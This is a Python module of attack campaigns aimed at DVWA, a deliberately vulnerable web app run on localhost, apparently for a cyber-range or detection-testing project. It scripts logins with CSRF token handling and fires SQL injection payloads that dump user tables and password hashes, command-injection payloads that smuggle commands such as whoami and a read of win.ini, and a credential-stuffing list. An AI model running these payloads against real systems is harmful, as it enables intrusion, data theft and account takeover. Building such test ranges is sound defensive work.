"""Attack campaigns for DVWA (the third target): sqli, command_injection, credential_stuffing.

Same attacker model as range/attacks/ (one Actor = one identity, spoofed browser UA, local range
only), pointed at a PHP/MySQL application with HTML-form logins and a CSRF token. DVWA at security
level "low" is deliberately vulnerable, on 127.0.0.1 only. The command-injection payloads here run
on the host (Windows cmd) if they get through, so they are read-only: whoami, echo, dir, type of
win.ini, ipconfig. Each campaign returns {objective_met, evidence}.
"""

from __future__ import annotations

import re
import sys
from http.cookiejar import DefaultCookiePolicy
import time
import urllib.parse
from pathlib import Path

ROOT = Path(__file__).resolve().parents[2]
sys.path.insert(0, str(ROOT / "range" / "attacks"))
from client import Actor        # noqa: E402,F401
import campaigns as JS          # noqa: E402  (user agent only)

SQLI = ["1' OR '1'='1", "1' OR 1=1-- -", "x' OR 'a'='a", "1' AND 1=1-- -",
        "1' UNION SELECT user,password FROM users-- -", "1' UNION SELECT 1,version()-- -",
        "' OR 1=1#", "1' ORDER BY 3-- -", "1') OR ('1'='1", "-1' UNION SELECT table_name,2 FROM information_schema.tables-- -"]
_H = "256.256.256.256"         # an invalid IP: ping fails at once, so the injected command is what takes time
CMDI = [_H + " & whoami", _H + " && whoami", _H + " | whoami", _H + " & echo aegiscmdi", _H + " ; id",
        _H + " & dir C:\\", _H + " & type C:\\Windows\\win.ini", _H + " & ipconfig", _H + " || whoami",
        _H + " `whoami`", _H + " $(whoami)", _H + " %0a whoami"]
CREDS = [("admin", "123456"), ("admin", "admin"), ("gordonb", "password"), ("pablo", "letmein"),
         ("smithy", "qwerty"), ("1337", "charley"), ("admin", "welcome"), ("gordonb", "abc123"),
         ("smithy", "iloveyou"), ("admin", "password1"), ("pablo", "dragon"), ("1337", "hunter2")]
VALID_MARK = "5f4dcc3b5aa765d61d8327deb882cf99"       # md5("password"): DVWA's seeded admin hash


class _LaxPolicy(DefaultCookiePolicy):
    """DVWA sets PHPSESSID for domain=localhost (it echoes the Host header) while we connect to 127.0.0.1
    (to avoid the ~2 s localhost delay on Windows); the stock policy would silently drop it."""

    def set_ok(self, cookie, request):
        return True


def _cookie(a) -> dict:
    if not isinstance(a.jar._policy, _LaxPolicy):
        a.jar.set_policy(_LaxPolicy())
    ck = [f"aegis_vid=atk-{a.actor_id}"]
    seen = {}
    for c in a.jar:
        if c.name in ("PHPSESSID", "security"):
            seen[c.name] = c.value
    ck += [f"{k}={v}" for k, v in seen.items()]
    return {"Cookie": "; ".join(ck)}


def _token(html: str) -> str:
    m = re.search(r"name=['\"]user_token['\"] value=['\"]([0-9a-f]+)['\"]", html)
    return m.group(1) if m else ""


def _form(d: dict) -> bytes:
    return urllib.parse.urlencode(d).encode()


def _post_form(a, path, d, **kw):
    h = _cookie(a)
    h["Content-Type"] = "application/x-www-form-urlencoded"
    return a.fire("POST", path, data=_form(d), headers=h, **kw)


def _get(a, path, **kw):
    return a.fire("GET", path, headers=_cookie(a), **kw)


def _login(a, user="admin", pw="password", malicious=False) -> bool:
    r = _get(a, "/login.php", stage="recon", technique="login-page", malicious=False)
    r = _post_form(a, "/login.php", {"username": user, "password": pw, "Login": "Login",
                                     "user_token": _token(r.body)},
                   stage="recon", technique="login", malicious=malicious)
    return r.status == 200 and "Logout" in r.body


def sqli(a, pace: float) -> dict:
    _login(a)                                   # DVWA's default credentials: the usual first move
    met, ev = False, ""
    for p in SQLI:
        r = _get(a, "/vulnerabilities/sqli/?" + urllib.parse.urlencode({"id": p, "Submit": "Submit"}),
                 stage="exploit", technique="sqli-id")
        if r.status == 200 and (VALID_MARK in r.body or r.body.count("First name") >= 3):
            met, ev = True, "injection returned extra rows / password hashes"
        time.sleep(pace)
    return {"objective": "dump the users table", "objective_met": met, "evidence": ev}


def command_injection(a, pace: float) -> dict:
    _login(a)
    met = False
    for p in CMDI:
        r = _post_form(a, "/vulnerabilities/exec/", {"ip": p, "Submit": "Submit"},
                       stage="exploit", technique="cmdi-exec")
        if r.status == 200 and ("aegiscmdi" in r.body or "[fonts]" in r.body.lower() or "Windows IP" in r.body
                                or re.search(r"\\\\[a-z0-9_-]+\\\\[a-z0-9_.-]+", r.body.lower())):
            met = True
        time.sleep(pace)
    return {"objective": "execute OS commands", "objective_met": met,
            "evidence": "command output in response" if met else ""}


def credential_stuffing(a, pace: float) -> dict:
    hits = []
    for u, p in CREDS:
        if _login(a, u, p, malicious=True):
            hits.append(u)
        time.sleep(pace * 0.5)
    return {"objective": "find valid credentials", "objective_met": bool(hits),
            "evidence": f"valid: {hits}" if hits else ""}


CAMPAIGNS = {"sqli": sqli, "command_injection": command_injection,
             "credential_stuffing": credential_stuffing}


def user_agent_for(campaign: str, mode: str = "browser") -> str:
    return JS.BROWSER_UA
